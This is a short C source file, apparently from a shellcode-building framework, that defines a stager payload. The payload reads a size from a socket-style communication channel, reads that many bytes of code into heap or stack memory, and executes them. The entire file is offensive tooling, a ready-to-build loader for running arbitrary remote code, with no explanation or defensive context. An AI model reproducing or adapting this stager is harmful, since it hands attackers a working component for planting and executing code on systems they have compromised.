#include <factory.h>
#include "helpers/io.c"
#include "helpers/socket.c"
#include "helpers/memory.c"
#include "helpers/cpu.c"

typedef __attribute__((noreturn)) void (* shellcode)(void);

enum memory {
    STACK,
    MMAP
};

#ifndef MEMORY
#define MEMORY MMAP
#endif

SHELLCODE_ENTRY {

    struct channel chan = get_communication_channel();
    unsigned short buffer_size = 0, count = 0;
    unsigned char *memory;

    _Static_assert(MEMORY == MMAP || MEMORY == STACK, "Must set MEMORY parameter to STACK or MMAP.");

    /* Read the size of the input buffer (2 bytes). */
    _read(chan.rx, &buffer_size, sizeof(buffer_size));
    if ( MEMORY == MMAP )
        memory = (unsigned char *) _malloc(buffer_size);
    else
        memory = get_sp() + 0x100;

    while ( count < buffer_size && _read(chan.rx, memory+count, 1) >= 0 )
        count++;

    ((shellcode) memory)();

} SHELLCODE_END
